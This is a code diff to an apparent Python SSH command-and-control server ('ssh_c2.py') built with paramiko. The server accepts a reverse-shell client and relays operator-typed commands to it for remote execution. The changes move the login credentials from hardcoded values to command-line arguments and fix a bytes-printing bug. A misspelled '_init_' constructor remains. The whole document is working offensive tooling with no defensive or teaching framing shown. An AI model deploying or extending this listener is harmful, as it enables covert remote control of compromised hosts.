@@ -1,6 +1,6 @@
 #!/bin/env python
-# python ssh_c2.py
-# python ssh_reverse_shell.py ip port
+# python ssh_c2.py ip port username password
+# python ssh_reverse_shell.py ip port username password
 
 import socket
 import paramiko
@@ -12,8 +12,12 @@ host_key = paramiko.RSAKey(filename="/tmp/test_rsa.key")
 
 
 class Server(paramiko.ServerInterface):
-    def _init_(self):
+    def _init_(self, username, password):
         self.event = threading.Event()
+
+    def set_credentials(self, username, password):
+        self.username = username
+        self.password = password
 
     def check_channel_request(self, kind, chanid):
         if kind == "session":
@@ -21,7 +25,7 @@ class Server(paramiko.ServerInterface):
         return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
 
     def check_auth_password(self, username, password):
-        if (username == "justin") and (password == "lovesthepython"):
+        if (username == self.username) and (password == self.password):
             return paramiko.AUTH_SUCCESSFUL
         return paramiko.AUTH_FAILED
 
@@ -35,6 +39,8 @@ class Server(paramiko.ServerInterface):
 if __name__ == "__main__":
     server = sys.argv[1]
     ssh_port = int(sys.argv[2])
+    username = sys.argv[3]
+    password = sys.argv[4]
 
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -52,6 +58,7 @@ if __name__ == "__main__":
         session.add_server_key(host_key)
         session.load_server_moduli()
         server = Server()
+        server.set_credentials(username, password)
         try:
             session.start_server(server=server)
         except paramiko.SSHException as x:
@@ -65,7 +72,7 @@ if __name__ == "__main__":
                 command = input("Enter command: ").strip("\n")
                 if command != "exit":
                     chan.send(command)
-                    print(chan.recv(1024) + "\n")
+                    print(chan.recv(1024) + b"\n")
                 else:
                     chan.send("exit")
                     print("exiting")
